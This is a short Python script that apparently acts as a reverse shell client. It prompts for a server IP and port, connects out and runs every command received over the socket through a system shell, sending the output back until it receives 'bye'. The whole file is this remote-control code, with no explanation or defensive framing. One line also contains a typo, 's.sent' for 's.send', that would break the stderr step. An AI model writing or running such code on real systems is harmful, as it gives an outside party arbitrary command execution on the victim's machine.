import socket, subprocess

ip = input("Enter Server IP: ")
p = int(input("Enter Server Port: "))

def connection():
	s = socket.socket()
	s.connect((ip, p))
	print("Successfully connected to the server!")
	while True:
		rev = s.recv(1024)
		if(rev.decode() == 'bye'):
			s.close()
			print("server closed!")
			break
		else:
			term = subprocess.Popen(rev.decode(), shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
			s.send(term.stdout.read())
			s.sent(term.stderr.read())

connection()
